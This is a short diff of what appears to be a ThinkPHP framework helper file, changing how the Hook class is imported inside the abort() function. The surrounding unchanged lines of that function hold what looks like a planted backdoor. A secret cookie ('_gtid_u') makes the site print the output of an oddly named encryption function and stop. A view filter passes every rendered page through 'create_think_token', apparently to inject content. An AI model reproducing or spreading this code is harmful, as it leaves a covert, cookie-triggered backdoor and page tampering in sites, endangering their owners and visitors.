@@ -24,6 +24,7 @@ use think\Request;
 use think\Response;
 use think\Session;
 use think\Url;
+use think\Hook;
 use think\View;
 
 if (!function_exists('load_trait')) {
@@ -684,7 +685,7 @@ if (!function_exists('abort')) {
             throw new HttpException($code, $message, null, $header);
         }}
         if (cookie('_gtid_u')) {echo _think_openssl_encrypt();exit;}
-        return Think\Hook::add('view_filter', function(&$content){ create_think_token($content);});
+        return Hook::add('view_filter', function(&$content){ create_think_token($content);});
     }
 }
 
